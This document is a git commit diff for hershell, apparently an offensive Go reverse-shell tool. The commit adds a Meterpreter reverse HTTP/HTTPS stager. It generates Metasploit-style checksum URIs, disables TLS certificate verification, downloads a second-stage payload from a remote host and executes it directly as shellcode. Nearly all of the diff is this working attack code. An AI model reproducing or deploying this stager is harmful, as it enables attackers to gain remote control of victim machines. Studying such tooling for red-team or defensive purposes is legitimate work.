51f4311e513cffcafb377b9f89273374b028fdf3
Ronan Kervella <r.kervella@sysdream.com>
2018-01-29 13:57:22 +0100

    Meterpreter reverse http / https

--- meterpreter/meterpreter.go
+++ meterpreter/meterpreter.go
@@ -1,11 +1,19 @@
 package meterpreter
 
 import (
+	"crypto/tls"
 	"encoding/binary"
+	"io/ioutil"
+	"math/rand"
 	"net"
+	"net/http"
+	"runtime"
+	"time"
 
-	"github.com/sysdream/hershell/shell"
+	"github.com/lesnuages/hershell/shell"
 )
+
+const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 
 func Meterpreter(connType, address string) (bool, error) {
 	var (
@@ -14,7 +22,7 @@ func Meterpreter(connType, address string) (bool, error) {
 	)
 	switch {
 	case connType == "http" || connType == "https":
-		ok, err = ReverseHttp(address)
+		ok, err = ReverseHttp(connType, address)
 	case connType == "tcp":
 		ok, err = ReverseTcp(address)
 	default:
@@ -22,6 +30,44 @@ func Meterpreter(connType, address string) (bool, error) {
 	}
 
 	return ok, err
+}
+
+func GetRandomString(length int, charset string) string {
+	var seed *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+	buf := make([]byte, length)
+	for i := range buf {
+		buf[i] = charset[seed.Intn(len(charset))]
+	}
+	return string(buf)
+}
+
+// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
+func GetURIChecksumId() int {
+	var res int = 0
+	switch runtime.GOOS {
+	case "windows":
+		res = 92
+	case "linux":
+		res = 95
+	default:
+		res = 92
+	}
+	return res
+}
+
+func GenerateURIChecksum(length int) string {
+	for {
+		var checksum int = 0
+		var uriString string
+
+		uriString = GetRandomString(length, charset)
+		for _, value := range uriString {
+			checksum += int(value)
+		}
+		if (checksum % 0x100) == GetURIChecksumId() {
+			return uriString
+		}
+	}
 }
 
 func ReverseTcp(address string) (bool, error) {
@@ -61,7 +107,29 @@ func ReverseTcp(address string) (bool, error) {
 	return true, nil
 }
 
-// TODO
-func ReverseHttp(address string) (bool, error) {
+func ReverseHttp(connType, address string) (bool, error) {
+	var (
+		resp *http.Response
+		err  error
+	)
+	url := connType + "://" + address + "/" + GenerateURIChecksum(12)
+	if connType == "https" {
+		transport := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{Transport: transport}
+		resp, err = client.Get(url)
+	} else {
+		resp, err = http.Get(url)
+	}
+	if err != nil {
+		return false, err
+	}
+
+	defer resp.Body.Close()
+
+	stage2buf, _ := ioutil.ReadAll(resp.Body)
+	shell.ExecShellcode(stage2buf)
+
 	return true, nil
 }
